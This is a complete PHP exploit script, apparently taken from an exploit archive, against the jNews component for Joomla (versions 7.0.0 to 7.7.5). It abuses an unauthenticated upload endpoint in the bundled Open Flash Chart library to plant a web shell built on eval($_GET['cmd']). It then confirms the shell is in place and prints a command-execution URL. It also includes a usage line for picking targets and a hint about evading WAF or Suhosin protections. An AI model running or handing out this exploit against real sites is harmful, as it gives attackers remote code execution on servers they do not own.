<?php
 
# Title:   jNews 7.0.0 <= 7.7.5 - Remote Code Execution (Exploit)
# Author:  Phizo (Joshua Coleman)
# Release: 31-10-2012

# 0day-ID-19668:
#   https://0day.today/exploit/19668
#   http://mvfjfugdwgc5uwho.onion/exploit/19668
 
echo <<<EOT
 
     -----------------------------------
    /   jNews 7.0.0 - 7.7.5 ~ Exploit   \
    \           Author: Phizo           /
     -----------------------------------
 
 
EOT;
 
 
$options = getopt('u:f:');
 
if(!isset($options['u'], $options['f']))
    die("\n\tUsage example: php jnews.php -u http://target.com/ -f shell.php\n
        -u http://target.com/\tThe full path to Joomla!
        -f shell.php\t\tThe name of the file to create.\n");
 
$url  =  $options['u'];
$file =  $options['f'];
 
$shell = "{$url}components/com_jnews/includes/openflashchart/tmp-upload-images/{$file}";
$url   = "{$url}components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name={$file}";
 
$data    = "<?php eval(\$_GET['cmd']); ?>";    # Consider WAFs or Suhosin-protected environments, etc., where appropriate.
$headers = array('User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Content-Type: text/plain');
 
 
echo "[+] Submitting request to: {$options['u']}\n";
 
$handle = curl_init();
 
curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
 
$source = curl_exec($handle);
curl_close($handle);
 
 
if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r'))
{
    echo "\t[+] Exploit completed successfully!\n";
    echo "\t______________________________________________\n\n";
    echo "\t{$shell}?cmd=system('id');\n";
}
else
{
    die("\t[x] Exploit was unsuccessful.\n");
}
 
?>
